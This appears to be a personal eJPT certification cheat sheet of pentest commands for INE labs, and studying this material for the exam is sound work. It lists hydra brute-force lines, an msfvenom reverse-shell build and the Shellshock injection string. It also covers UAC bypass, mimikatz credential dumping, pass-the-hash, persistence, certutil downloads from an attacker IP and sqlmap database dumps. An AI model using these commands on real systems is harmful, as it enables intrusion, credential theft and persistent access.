## eJPT cheat sheet

``Information gathering``

**host [website]** obtain IP of the website. If you have several IP => probably a proxy     

**whatweb [URL] -a=LEVEL** level is relative to stealth. Information about technology of the website    

**whois [website]**        

**dnsrecon -d [website]**  python script that provides recon for DNS       

**python sublist3r.py option [website.com]** subdomain enumeration, but can be blocked  
-d domain   
-b bruteforce   
-e specify a list of search engines (comma separated)   

**dnsenum [website]** by default brute force
**fierce -dns [website]**   
**theharvester -d [domain]** mail harvesting    
**wafw00f [website.com]** -a WAF detector 

``Footprinting & scanning``

*Host discovery*    

**ping [website.com]** is the command line to know if the website is online and the IP address of the website. 

**ping -c [number] [IP]** the IP can be the broadcast  (you’ll have to add -b)  

**fping -a  -g [IP]/[subnet mask] 2>/dev/null** other way to do the ping sweeps     

**nmap -sn |IP]/[subnet mask]** no port scan , it combines ICMP echo request, TCP SYN and TCP ACK
**nmap -sn -PS [IP]** TCP SYN on port 80 by default if you don’t add details on port.   
You can port range to -PS option like ; -PS1-1000
port scanning   
**-Pn** don’t ping option, don’t do host discovery  
**-p[port number]** scan specific port or range     
**-p-** scan all the TCP port   
**-sT** TCP connect scan    
**-sS** SYN scan, stealth scan  
**-sU** UDP scan    
**-sV** service version     
**-O** operating system     
**-sC** script scan     
**--script=[name of the script]**   
**-T<0-5>** speed (T3 is by default)   

``Enumeration`` 

**ipconfig** command on windows to see our IP

**nc [IP] [PORT]** banner grabbing  

**SMB**     

**smbmap** connect and find shares and some times more access if you login with username and paswords       
With Metasploit you have a **smb_version** scanner

**smbclient -L [IP]** list of hosts     
**enum4linux**  my favorite tool    
**rpcclient -U “” [IP]** for null session

**FTP**

**ftp [IP]** to connect => don’t forget to try “Anonymous”  (check NMAP result)     
**hydra -L [wordlist from metasploit] -P [list of user] [IP] ftp**  
In NMAP you have a script ftp-brute     

**SSH**     

**ssh [user]@[IP]** to connect      
**hydra -l [user] -P /usr/share/wordlists/rockyou.txt [IP] ssh**

**MySQL**   

**mysql -h [IP] -u [user]** to connect  
**show databases;**     
**use [database];**     
with Metasploit => scanner **mssql_login**

``System-Host based attacks``   

*WINDOWS*   

*Microsoft IIS WebDAV*  
**davtest –url [URL/webdav/] -auth [username:password]** 
Will give you the extension you can uploads     
**cadaver [URL/webdav/]**  will allow you to connect (but will ask you the username and password)       
Then on the console of cadaver you write put [path of your webshell on your machine]        
on the /webdav/ on the website you click on the file you upload and will put commands on the search bar.      

SMB with psexec         
With Metasploit, you can find a SMB brute force tool **SMB_login**  
**psexec.py [Username]@[IP] cmd.exe**       



RDP     
Metasploit; **rdp_scanner**     
hydra with rdp://IP     

WinRM       
With Crackmapexec:       
**crackmapexec winrm $IP -u administrator -p [wordlist for passwords]**     
Once you have the password => you can use crackmapexec to execute commands on the remote machine.           
**crackmapexec winrm $IP -u [login] -p [password] -x “commands you want to execute”**   

With evil-winrm:        
**evil-winrm -u [user] -p ‘[password]’ -i $IP** We have a command shell now with this, also available with Metasploit   

*Windows Privilege Exploitation*        
On metasploit you have a module **local_exploit_suggester**, which gives you a good way to get privilege escalation.        
**getsystem** command on Metasploit can help you sometimes.     
You can find also this python script https://github.com/Pwnistry/Windows-Exploit-Suggester-python3 With this script you take the result of the command systeminfo in a text files.      

UAC     
https://github.com/hfiref0x/UACME you can use metasploit upload command
The idea is the following:
1. you create a backdoor with msfvenom
2. on the victim machine you upload the backdoor and the Akagi you found on UACME github (tips you do it on a temporary dir you create mkdir temp)
3. set up a listener (from metasploit or not) 
4. execute .\Akagi.exe 23 C:\\temp\backdoor.exe
5. ps => then migrate to a process (first colon) with NT AUTHORITY migrate [number]     

Access token impersonation      
If you type **getprivs** in your meterpreter session, you’ll see if you can impersonate or not (if you have **SeImpersonatePrivilege**).    
**Incognito** is a buit-in meterpreter module that allows you to impersonate user token. 
To use it on your meterpreter session you type **load incognito**   
**list_tokens -u** will give you the users you can get a token  
**impersonate_token “[name of the user]”** to impersonate someone, you got the name of the user with the previous command (list_token -u)       


Windows credentials dumping    
On meterpreter you can type **search -f Unattend.xml**      
But you’ll find it on **C:\\Windows\Panther\**
It’s always in base64 => you have to decoded it     
You can dump also credentials with mimikatz     
On meterpreter we have a version of mimikatz named **kiwi**.        
To use it you need privileged access or it’s not working as it access the SAM.      
On meterpreter you type **load kiwi **      
**?** to have the help menu     
You have different commands possible on kiwi like **creds_all** or **lsa_dump_sam** 
If you don’t want to use kiwi => you type (on meterpreter) **upload /usr/share/windows-ressources/mimikatz/x64/mimikatz.exe**
Once launched if you type **privilege::debug** => if the result is 20 ok it means you can use it without issue.     



*LINUX*

Shellshock      
The vulnerability happens after different characters which will execute bash commands           
**() { :; }; /bin/bash -c ‘[your command]’**    
Some Apache servers which used .sh scripts can be vulnerable. You’ll need to find a way where to inject the characters like a HTTP headers (using burp). You target the CGI scripts.        
With metasploit you have a module shellshock.

FTP     
**hydra -L [users wordlist] -P [passwords wordlist] [IP] -t 4 ftp** 

SSH     
**hydra -L [users wordlist] -P [passwords wordlist] [IP] -t 4 ssh**

Samba        
**hydra -L [users wordlist] -P [passwords wordlist] [IP] -t 4 smb**     
You can also use smbmap tool.       
**smbmap -H [IP] -u [user] -p [password]** for user enumeration     
**smbclient -L [IP] -U [user]** for enumeration of shares       
**smbclient //[IP]/[share] -U [user]** to connect to this share
**?** To see all comands we can used        
enum4linux tool     
**enum4linux -a [IP]** to get informations  
-U option => get all users      
-u [user] => connect as     


*Linux privilege escalation*          

**sysinfo**     
**upload [linux-exploit suggester where you have it on your machine]** 
don’t forget to chmod it    
Then you execute it => you’ll get info + probable exploit you can use   
**crontab -l **     
**cat /etc/crontab**        
**grep -rnw /usr -e “/home/student/message”** in this exemple you can replace /usr by an other place  also after the -e option you have to put the directory where you find a file related to a CRON job        
Once you find the file you can modify you can for exemple add your group user to /etc/sudoers       
**file [SUID file]**    
**strings [SUID file]**     
**cp /bin/bash [file]** 

prefix      
$1 MD5      
$2 Blowfish     
$5 SHA-256      
$6 SHA-512      
cat /etc/shadow     
hashdump module on metasploit       

``Metaspoit``      

**sudo systemctl start postgresql**     
**sudo systemctl status postgresql** to check       
**sudo msfdb init**     
**msfconsole**      

**set [variable]** for local variables      
**setg [variable]** for global variables        
Variable can be LPORT, RHOST, etc……     
**search [what_you_search]** for searching a tool       
**search type:auxiliary [what you’re looking for]**     
**use [number/path of the module]** to use what you found       
**show options** to check all options of the modules you selected       
**info**    
**run** or **exploit** once all is setup 
**back** command to go back to the original thing   
**sessions** to see all sessions active         
**connect [IP:PORT]** is like netcat for netcat grabbing to get the banner
hosts to see all hosts we have      

**db_nmap -sS -sV -O [IP]** for nmap scan within Metasploit     
How to see difference between staged and non-staged? If you have a / between the method and the protocol at the end => this a staged payload 
example;        
/meterpreter/reverse_http => staged     
/meterpreter_reverse_http => non-staged     

https://www.revshells.com/ (MSFVenom part)      
**msfvenom -a x86 -p /windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=the_open_port -f exe > payload.exe**      
-a architecture like x86        
-p OS type and protocol     
LHOST listening host        
LPORT listening port on your machine        
-f format version (here it’s a exe file we want)        
the -a options is not mandatory as you can put it in the -p
To encode it’s an option at the end of the command -e [your encoding option]        
-e x86/shikata_ga_nai       
-i [number] number of iterations        
Don’t forget to set PAYLOAD [same as your msfvenom] in the Metasploit       handler. 


*Meterpreter*     
**help** to see all commands        
**sysinfo** to get informations about the OS version        
**getuid** to know our permissions
**background** the session (or CTRL+Z)      
**sessions** list all sessions
**sessions -h** for help        
**download [filename]** to get the file on your current directory       
**search -f *.php** to search for .php extension file       
**ps** then **migrate [process id]** but you have to get the permissions to do this     

Often in the course, we have the use of **/post/multi/manage/shell_to_meterpreter**     
You just need to ctrl+Z to background the session       
**session -u [session number]** upgrade it (not always possible)

*Windows Post Exploitation*      

**getsystem** attempt to elevate your privilege     
**show_mount** to see all mounts/drives     
on post/windows we saw      
**/gather/win_privs** gather privilege of the current user      
**/gather/enum_logged_on_users**        
**/gather/enum_applications** enumeration of applications, may be you can use them to escalate privilege        
**/gather/enum_av_excluded** interesting in some cases (don’t seems to be too in depth during the course)       
**/gather/enum_computers** Windows gather enumerates computer       
**/gather/enum_shares** enumerate SMB shares        

bypassing UAC       
you’ll need to have a x64 reverse shell     
**/exploit/windows/bypassuac_injection**        
set TARGET Windows\ x64 if there is an error regarding the injection        
then you can use getsystem command for privilege escalation     

token impersonation with incognito      
On the account we need specific setup ; **SeAssignPrimaryToken**, **SeCreateToken**, **SeImpersonatePrivilege** (you check with getprivs command)   
**load incognito**      
**list_tokens -u** to see the possibilities     
**impersonate “[the result you got earlier]”** (it has to be between “”)        

dumping hashes with Mimikatz        
**load kiwi**       
in the help of metrepreter at the end you’ll have the kiwi commands
**creds_all**       
**lsa_dump_sam** (you can find other users hashes here compare to the first command)        
**lsa_dump_secrets**        

pass-the-hash with PSExec       
Once you have hashes you’ll use psexec      
**/exploit/windows /smb /psexec**       
**set SMBUser [user]**      
**set SMBPass [hash or cleartext password]**        
**/exploit /windows/local /persistence_service**        

Pivoting with metasploit        
Once you’re on the first machine, you can type ipconfig to check the subnet mask and the IP     
If you have any doubt you can check here ; https://en.wikipedia.org/wiki/Wildcard_mask          
run autoroute -s XX.XX.XX.0/20      
tips form the course => rename your session in metasploit       
session -n [name you want like victim-1] -i [number of your session]        
Don’t forget this route is only within the metasploit framework, you can’t use nmap but you have to use the auxiliary tcp port scanner.         
From this scan if you want for example to access a port 80 (found by the auxiliary tcp port scanner) on the second machine you do a portforwarding.
portfwd add -l [the port you want to use on your own machine like 1234] -p [80 from victime2] -r [victim 2 IP] from there you can use nmap -sS -sV -p 1234 localhost        
**ip route add <network_ip>/<cidr> via <gateway_ip>** May be do this during the exam.


on /post/linux we saw   
**/linux/gather/enum_configs** linux gather configurations => you have to type loot command afterward       
**/linux/gather/env** => still loot command     
**/linux/gather/enum_protections** to check the hardening of the machine => notes command       
**/linux/gather/hashdump** gather hash      


``Exploitation``       


Banner grabbing & searching exploits        
With netcat you can type **nc [IP] [port]**     
The script of nmap are on **/usr/share/nmap/scripts**       
Exploit-db https://www.exploit-db.com/      
Rapid7 https://www.rapid7.com/db/       
**searchsploit [service you’re looking for]**        
**searchsploit -m [number]** allow you to copy the exploit to your current directory        

Netcat fundamentals     
-v verbose      
-l listen for incoming connections      
-u for udp (by default it’s TCP)        
-n do not resolve hostnames by DNS      
-p specify source port to use       
**nc -lvnp [port number]**      
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 
https://www.revshells.com/ 


``Post-exploitation``      


**WINDOWS**     

On meterpeter;  
**getuserid** to get the current user       
**sysinfo** to get the system information       
**getprivs** to see our privilege       
the module **enum_logged_on_users** allow you to see users   

On shell;       
**whoami** or **whoami /priv** for privilege        
**hostname**        
**systeminfo**      
**wmic qfe get Caption,Description,HotFixID,InstalledOn**   
**net users** to see all users => **net users [username]** to get the information regarding this user       
**net localgroup**      

Enumerating network information     
**ipconfig** to have some info (default gateway) + subnet mask for later        
**route print** to see the route table      
**arp -a** arp table    
**netstat -ano** print listening services       
**netsh firewall show state** to see the state of the firewall      

Enumerating processes and services      
**ps** list of processes        
**pgrep explorer.exe** recommend in the course => migrate [process ID we had from the prev. command]        
**tasklist /SVC** display list of processes running and services running under particular process       
**schtasks /query /fo LIST** scheduled task

Automate    
On Metasploit; **post/windows/gather/win_privs** gather privilege   
**JAWS** https://github.com/411Hall/JAWS you can copy it into the machine (the ps1)         
WARNING => on INE lab environment CTRL+SHIFT+ALT => open your clipboard option      
**powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt**      


**LINUX**


**/bin/bash -i** to have a proper bash terminal 
**sysinfo** system info     
**hostname**        
**cat /etc/issue**     
**cat /etc/*release** for more details      
**uname -a**        
**cat /etc/passwd** to see users        
**group [user]** to see the group of the [user]     
**last** last user connected   

Enumerating network information

**ifconfig**    
**netstat** connection list     
**route** routing table in meterpreter      
**cat /etc/network**        
**cat /etc/.resolv.conf** for dns       
**arp -a**      

Enumerating processes and CRON jobs     
**ps** with meterpreter     
**crontab -l**      
**cat /etc/cron*** we use the wildcard because we have a lot of possibilities       

Automate        
**LinEnum** https://github.com/rebootuser/LinEnum       
WARNING => on INE lab environment CTRL+SHIFT+ALT => open your clipboard option      
you copy the content of the script => load it through meterpreter or any other solution => you run the script       

On Metasploit;      
**post/linux/gather/enum_configs** then you can cat the content of the files created        
**post/linux/gather/enum_network** then you can cat the content of the files created        
**post/linux/gather/enum_system** same logic   

TRANSFERING FILES       
**python -m SimpleHTTPServer [port number]**        
*With windows*        
**certutil -urlcache -f  http://[YOUR_IP]/[file _you_want] [how_you_want_to_be_named_once_dl]**     
*With linux*        
**wget http://[YOUR_IP]/[file _you_want]**      

UPGRADING SHELL     
We saw **/bin/bash -i** in the previous videos      
You can check the possibilities **cat /etc/shells**     
If you have python install (on the target) => you check **python –version**     
**python -c 'import pty; pty.spawn("/bin/bash")'** 


**WINDOWS PRIV ESC**
https://github.com/itm4n/PrivescCheck      

Dumping & Cracking      
*Windows*       
**john - -format=NT [files_with_hashes] - -wordlist=[Path_tou_your_wordlist]**       
**hashcat -a3 -m=1000 [file_with_hash] - -wordlist=[Path_tou_your_wordlist]**       
*Linux*     
Check the value on **/etc/shadow** file regarding the $[number]$ 
[then used the same as windows]         

Persistence windows     
/exploit/windows/local/persistence_service Metasploit module        




``Web applications``        

GOBUSTER        
**gobuster dir -u https://[website].com/ -w [wordlist_path]** 

NIKTO       
**nikto -h [IP] **      
-p [port,port] to scan specific ports       

WPSCAN      
**wpscan –update** to update        
**wpscan --url http://[website] --enumerate [letter]**  
     p plugins 
  t themes  
  u usernames   
  v vulnerability but to use with other letters like vp     
**wpscan –-url http://[website] –-passwords path/to/rockyou.txt –-usernames [from previous command u]** to try to connect with rockyou.txt      

SQLMAP      
GET method => through url so -u         
POST method => through txt file (from burp)     
To operate with SQLMAP you do a request from burpsuite => you copy it (using burpsuite not CTRL+C CTRL+V)       
**sqlmap -r <request_file> -p <vulnerable_parameter> --dbs** find the SQL type + tables         
For GET method to do the same thing         
**sqlmap -u https://testsite.com/page.php?id=7 –dbs**       
Once you get the database name you pivot for tables ;       
With the GET method     
**sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns**   
With the POST method    
**sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables**
Then you can get the columns        
With GET method         
**sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns**       
With POST method        
**sqlmap -r req.txt -D <database_name> -T <table_name> --columns**
You can also simply dump all with --dump-all                

XSSer       
**xsser –url “[your_url]” -p “[payload]” –auto**   
-p option = what you get from your burpsuite





